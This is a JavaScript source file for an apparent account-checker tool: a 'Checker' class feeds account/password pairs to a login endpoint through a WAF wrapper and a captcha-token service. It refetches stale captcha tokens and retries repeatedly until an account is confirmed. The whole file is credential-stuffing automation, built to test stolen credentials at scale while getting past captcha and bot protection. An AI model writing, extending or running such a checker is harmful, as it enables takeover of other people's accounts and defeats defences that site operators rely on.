const { Api } = require('./api');

class Checker {
  constructor(waf, captcha, log) {
    this.waf = waf;
    this.captcha = captcha;
    this.log = log;
    this.MAX_ROUNDS = 6;
    this.RETRY_DELAY = 150;
  }

  leq(msg) {
    if (this.log) this.log.ev(msg);
  }

  tiny(str) {
    if (!str) return '';
    const trim = str.trim();
    if (trim.length <= 60) return trim;
    return trim.substring(0, 60) + '...';
  }

  sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  async check(account, password) {
    let take = await this.captcha.take();
    if (!take) {
      this.leq('CAPTCHA no token (servers down)');
      return 'captcha fail (servers down)';
    }

    let lastResult = null;
    for (let i = 0; i < this.MAX_ROUNDS; i++) {
      try {
        const login = await this.waf.login(
          Api.loginPayload(account, Api.md5(password), take),
          '/login'
        );
        this.waf.lastReqAccount = account;
        const result = login || 'step1 timeout';
        
        if (login && login.length < 400 && !login.trim().startsWith('{')) {
          this.leq(`API-> ${login.trim()}`);
        }

        const verdict = Api.verdict(login);
        if (verdict) {
          this.leq(`✓ ${verdict} for ${account}`);
          return login;
        }

        if (!login || !login.includes('Error_ECaptcha_VerifyFail')) {
          this.leq(`retry# ${i + 1} ${this.tiny(result)}`);
          await this.sleep(this.RETRY_DELAY);
        } else {
          this.leq(`CAPTCHA stale ${i + 1}/${this.MAX_ROUNDS}, refetch`);
          take = await this.captcha.take();
          if (!take) {
            this.leq('CAPTCHA no token (servers down)');
            return 'captcha fail (servers down)';
          }
        }
        lastResult = result;
      } catch (error) {
        this.leq(`Exception: ${error.message}`);
        lastResult = `exception: ${error.message}`;
      }
    }
    return lastResult || 'unresolved x6';
  }

  async checkWithRetry(account, password, maxRetries = 3) {
    let lastError = null;
    for (let i = 0; i < maxRetries; i++) {
      try {
        const result = await this.check(account, password);
        if (!result.includes('timeout') && !result.includes('fail')) {
          return result;
        }
        lastError = result;
        await this.sleep(500);
      } catch (error) {
        lastError = error.message;
        await this.sleep(500);
      }
    }
    return lastError || 'check failed after retries';
  }
}

module.exports = Checker;